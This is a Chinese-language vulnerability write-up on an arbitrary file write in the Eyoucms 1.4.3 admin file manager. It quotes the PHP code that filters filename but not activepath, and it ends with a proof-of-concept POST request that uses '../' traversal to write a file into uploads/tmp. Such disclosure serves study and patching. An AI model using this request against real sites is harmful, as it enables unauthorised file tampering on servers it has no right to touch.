Eyoucms 1.4.3 任意文件写入
==========================

一、漏洞简介
------------

可写入html,css,js,txt文件，总体来说比较鸡肋。

二、漏洞影响
------------

Eyoucms 1.4.3

三、复现过程
------------

### 漏洞分析

漏洞点只对`filename`进行过滤，而忘了`activepath`也可以`../`进行跳转
`application/admin/controller/Filemanager.php`

      if (IS_POST) {
             $post = input('post.', '', null);
             $content = input('post.content', '', null);
             $filename = !empty($post['filename']) ? trim($post['filename']) : '';
             $content = !empty($content) ? $content : '';
             $activepath = !empty($post['activepath']) ? trim($post['activepath']) : '';

                 ... ...

             $r = $this->filemanagerLogic->editFile($filename, $activepath, $content);
             if ($r === true) {
                 $this->success('操作成功！', url('Filemanager/index', array('activepath'=>$this->filemanagerLogic->replace_path($activepath, ':', false))));
                 exit;
             } else {
                 ... ...

跟进`editFile`函数

    application/admin/logic/FilemanagerLogic.php
     public function editFile($filename, $activepath = '', $content = '')
     {
         $fileinfo = pathinfo($filename);// pathinfo获取后缀
         $ext = strtolower($fileinfo['extension']);

         ......

         /*允许编辑的文件类型*/
         if (!in_array($ext, $this->editExt)) { //<<<<<基于白名单，暂时没有想到绕过的方法>>>>>
             return '只允许操作文件类型如下：'.implode('|', $this->editExt);
         }
         /*--end*/

         $filename = str_replace("..", "", $filename);// 仅对filename进行过滤
         $file = $this->baseDir."$activepath/$filename"; // 此处直接拼接产生漏洞
         if (!is_writable(dirname($file))) {
             return "请把模板文件目录设置为可写入权限！";
         }
         if ('css' != $ext) {
             $content = htmlspecialchars_decode($content, ENT_QUOTES);
             $content = preg_replace("/(@)?eval(\s*)\(/i", 'intval(', $content);//
             // $content = preg_replace("/\?\bphp\b/i", "？ｍｕｍａ", $content);
         }
         $fp = fopen($file, "w");
         fputs($fp, $content);
         fclose($fp);
         return true;
     }

### 漏洞复现

### poc

     POST /eyoucms/login.php?m=admin&c=Filemanager&a=newfile&lang=cn HTTP/1.1
     Host: 127.0.0.1
     User-Agent: Mozilla/5.0 (X11; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
     Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
     Accept-Encoding: gzip, deflate
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 94
     Origin: http://127.0.0.1
     Connection: close
     Referer: http://127.0.0.1/eyoucms/login.php?m=admin&c=Filemanager&a=newfile&activepath=%3Atemplate%3Aplugins%3Atest&lang=cn
     Cookie: home_lang=cn; admin_lang=cn; PHPSESSID=h6k34lgf1svcatllongehqqdt0; workspaceParam=index%7CFilemanager; XDEBUG_SESSION=18705
     Upgrade-Insecure-Requests: 1

     activepath=%2Ftemplate%2Fplugins%2Ftest/../../../uploads/tmp&filename=newfile.htm&content=test
